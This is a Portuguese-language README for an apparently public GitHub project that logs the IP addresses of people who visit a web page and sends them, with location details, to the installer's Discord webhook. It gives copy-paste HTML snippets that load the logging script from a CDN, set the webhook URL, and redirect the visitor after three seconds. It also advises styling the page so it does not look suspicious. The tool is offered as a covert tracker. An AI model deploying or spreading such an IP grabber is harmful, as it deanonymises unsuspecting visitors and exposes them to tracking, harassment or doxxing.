# Dados IP para Discord Webhook

Com este programa JavaScript você pode registrar o IP de alguém visitando seu site e enviar informações de IP para o seu Discord Webhook.


# 👀 Visualização

<img src="https://media.discordapp.net/attachments/943973140604784670/965191071996981268/unknown.png" width="600px" alt="Example image.">
A bandeira do país muda para o país onde o IP está localizado!

<br>

# 🎬 Uso
## Method 1 (CDN):
Basta copiar isso em seu site e alterar o URL de redirecionamento e webhook:

```HTML
<!-- Copy this into the <head> -->
<meta http-equiv="refresh" content="3;url=MAINPAGE.html" /> 

...

<!-- Copie isso no final de <body> -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
<script src="https://cdn.jsdelivr.net/gh/luisoos/IP-Log-To-Discord-Webhook/index.js"></script>
<script>var webHookUrl = "YOUR_WEBHOOK_URL_HERE";</script>
```

## Method 2 (Local):

### Set up
Copy the project.

Altere a variável `webHookURL` em [`index.js`](https://github.com/luisoos/IP-Log-To-Webhook/blob/main/index.js) ao seu URL.

### Redirecionar
Deixe um usuário redirecionar para outro site depois que o IP for registrado.

Basta adicionar o seguinte ao seu`<head>` em [`index.html`](https://github.com/luisoos/IP-Log-To-Webhook/blob/main/index.html):

```
<meta http-equiv="refresh" content="3;url=MAINPAGE.html" />
```

### Dica adicional
Se desejar, você pode estilizar o [`index.html`](https://github.com/luisoos/IP-Log-To-Webhook/blob/main/index.html) arquivo, para que não pareça muito suspeito.


# 📑 Anotações
## Licença
Este projeto está licenciado sob a [`MIT License`](https://github.com/luisoos/IP-Log-To-Webhook/blob/main/LICENSE).
## Visualização móvel do Discord
<img src="https://media.discordapp.net/attachments/943973140604784670/965186137243148308/IMG_9823.png?width=471&height=683">
